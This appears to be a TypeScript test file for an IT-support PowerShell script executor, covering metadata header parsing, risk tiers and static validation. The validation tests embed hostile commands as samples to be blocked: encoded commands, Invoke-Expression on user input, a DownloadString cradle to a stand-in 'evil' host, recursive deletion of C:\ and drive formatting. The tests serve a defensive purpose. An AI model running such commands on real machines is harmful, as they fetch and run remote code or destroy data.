/**
 * it-support-executor.test.ts — Phase 24 tests
 *
 * Covers:
 *   - Metadata header parsing (LOCALAI_IT_SCRIPT marker, required fields)
 *   - Static validation blocks scripts missing required metadata
 *   - Static validation blocks dangerous patterns (encoded PS, IEX, format)
 *   - Tier 5 manual_only patterns (Remove-ADUser etc.) are blocked
 *   - Validate mode does not require approval
 *   - Execute mode requires matching approval
 *   - Approval payload-hash mismatch is rejected
 */

import { describe, it, expect, beforeAll } from "vitest";
import {
  parseScriptMetadata,
  validateItScript,
  ensureItExecutorRegistered,
  IT_EXECUTOR_KIND,
} from "../lib/it-support-executor.js";
import { listRegisteredExecutors } from "../lib/approved-executor.js";

const VALID_HEADER = `<#
LOCALAI_IT_SCRIPT: true
Purpose: Verify time sync configuration on local machine
RequiresAdmin: false
Changes: w32time service start state
Reads: w32tm /query /status output
BackupPlan: Original w32time service state captured before changes
RollbackPlan: Stop-Service w32time; Restore prior config
DryRunSupported: true
VerificationSteps: Run w32tm /query /status; Confirm Stratum < 5
ExpectedExitCodes: 0
#>

[CmdletBinding(SupportsShouldProcess)]
param()

if ($PSCmdlet.ShouldProcess("w32time service", "Check configuration")) {
  Get-Service w32time | Format-Table -AutoSize
}
`;

describe("it-support-executor: metadata parser", () => {
  it("recognises a complete LOCALAI_IT_SCRIPT header", () => {
    const meta = parseScriptMetadata(VALID_HEADER);
    expect(meta.marker).toBe(true);
    expect(meta.purpose).toContain("time sync");
    expect(meta.requiresAdmin).toBe(false);
    expect(meta.dryRunSupported).toBe(true);
    expect(meta.expectedExitCodes).toEqual([0]);
    expect(meta.missing).toEqual([]);
  });

  it("flags missing fields", () => {
    const partial = `<#
LOCALAI_IT_SCRIPT: true
Purpose: just a fragment
#>
Get-Service`;
    const meta = parseScriptMetadata(partial);
    expect(meta.marker).toBe(true);
    expect(meta.missing.length).toBeGreaterThan(0);
    expect(meta.missing).toContain("RequiresAdmin");
    expect(meta.missing).toContain("BackupPlan");
  });

  it("flags missing marker when no LOCALAI_IT_SCRIPT line", () => {
    const noMarker = `# Just a script
Get-Service`;
    const meta = parseScriptMetadata(noMarker);
    expect(meta.marker).toBe(false);
    expect(meta.missing).toContain("LOCALAI_IT_SCRIPT marker");
  });
});

describe("it-support-executor: static validation", () => {
  it("passes a well-formed script with WhatIf support", () => {
    const result = validateItScript(VALID_HEADER);
    expect(result.valid).toBe(true);
    expect(result.blocked).toBe(false);
    expect(result.reasons).toEqual([]);
    expect(result.riskTier).toBe("tier2_safe_local_execute");
  });

  it("blocks scripts missing required metadata", () => {
    const noMeta = `Get-Service w32time | Format-Table -AutoSize`;
    const result = validateItScript(noMeta);
    expect(result.blocked).toBe(true);
    expect(result.reasons.some((r) => r.includes("metadata"))).toBe(true);
  });

  it("blocks scripts using -EncodedCommand", () => {
    const encoded = VALID_HEADER + "\npowershell -EncodedCommand SGVsbG8=";
    const result = validateItScript(encoded);
    expect(result.blocked).toBe(true);
    expect(result.reasons.some((r) => /Encoded PowerShell/i.test(r))).toBe(true);
  });

  it("blocks scripts using Invoke-Expression", () => {
    const iex = VALID_HEADER + "\nInvoke-Expression $userInput";
    const result = validateItScript(iex);
    expect(result.blocked).toBe(true);
    expect(result.reasons.some((r) => /Invoke-Expression/i.test(r))).toBe(true);
  });

  it("blocks scripts using DownloadString", () => {
    const dl = VALID_HEADER + "\n(New-Object Net.WebClient).DownloadString('http://evil')";
    const result = validateItScript(dl);
    expect(result.blocked).toBe(true);
    expect(result.reasons.some((r) => /DownloadString/i.test(r))).toBe(true);
  });

  it("blocks tier5 manual_only operations", () => {
    const removeUser = VALID_HEADER + "\nRemove-ADUser -Identity test.user";
    const result = validateItScript(removeUser);
    expect(result.blocked).toBe(true);
    expect(result.riskTier).toBe("tier5_manual_only_prohibited");
  });

  it("blocks recursive root deletion", () => {
    const wipe = VALID_HEADER + "\nRemove-Item -Recurse -Force C:\\";
    const result = validateItScript(wipe);
    expect(result.blocked).toBe(true);
    expect(result.reasons.some((r) => /root deletion/i.test(r))).toBe(true);
  });

  it("blocks drive format command", () => {
    const fmt = VALID_HEADER + "\nformat C:";
    const result = validateItScript(fmt);
    expect(result.blocked).toBe(true);
  });

  it("escalates risk tier when admin is required", () => {
    const adminHeader = VALID_HEADER.replace("RequiresAdmin: false", "RequiresAdmin: true");
    const result = validateItScript(adminHeader);
    expect(result.valid).toBe(true);
    expect(result.riskTier).toBe("tier3_file_modification");
  });
});

describe("it-support-executor: registration", () => {
  beforeAll(() => {
    ensureItExecutorRegistered();
  });

  it("is registered with the approved-executor framework", () => {
    expect(listRegisteredExecutors()).toContain(IT_EXECUTOR_KIND);
  });

  it("is idempotent — calling ensureItExecutorRegistered twice is fine", () => {
    const before = listRegisteredExecutors().filter((k) => k === IT_EXECUTOR_KIND).length;
    ensureItExecutorRegistered();
    const after = listRegisteredExecutors().filter((k) => k === IT_EXECUTOR_KIND).length;
    expect(after).toBe(before);
  });
});
